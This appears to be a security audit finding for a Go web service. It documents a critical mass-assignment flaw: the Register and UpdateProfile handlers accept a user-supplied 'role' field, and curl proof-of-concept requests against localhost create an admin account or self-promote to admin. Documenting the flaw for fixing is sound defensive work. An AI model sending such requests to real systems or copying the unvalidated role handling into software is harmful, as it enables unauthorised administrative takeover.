# C5 — Mass Assignment: Privilege Escalation via `role` (V10)

**Severity:** Critical  
**CWE:** CWE-915 | **OWASP:** A04:2021  
**Status:** Confirmed (cold-verified)  
**Source draft:** `piolium/findings-draft/p7-010-v10-mass-assignment.md`

## Summary

Both `POST /register?role=admin` and `POST /api/user/update {"role":"admin"}` accept the `role` field from the user and persist it directly. No allowlist, no role-validation.

## Vulnerable Code

**Registration** (`handlers/auth.go::Register`):
```go
role := r.URL.Query().Get("role")
if role == "" { role = "user" }
// ...
db.DB.Exec("INSERT INTO users (username, email, password, role) VALUES (?, ?, ?, ?)",
    body.Username, body.Email, body.Password, role)
```

**Profile update** (`handlers/profile.go::UpdateProfile`):
```go
var body struct { ...; Role string `json:"role"` }
// ...
db.DB.Exec("UPDATE users SET username=?, email=?, password=?, role=? WHERE id=?",
    body.Username, body.Email, body.Password, body.Role, userID)
```

## Impact

- Unauthenticated creation of admin accounts (Register path).
- Any logged-in user can self-promote (UpdateProfile path).
- Full administrative access on the next request.

## PoC

**Create admin (no session needed):**
```bash
curl -X POST "http://localhost:4443/register?role=admin" \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","email":"h@evil.com","password":"pw"}'
```

Response: `{"message":"account created successfully","user_id":6}`.

**Verify admin:**
```bash
curl "http://localhost:4443/api/user/profile?id=6" -H "Cookie: restaurant_session=<any_session>"
# Returns "role":"admin"
```

**Self-promote (already logged in):**
```bash
curl -X POST http://localhost:4443/api/user/update \
  -H "Content-Type: application/json" \
  -H "Cookie: restaurant_session=<alice_session>" \
  -d '{"role":"admin"}'
```

## Cold Verification

Re-read source: both handlers trust the role field unconditionally. Register path requires no prior session.
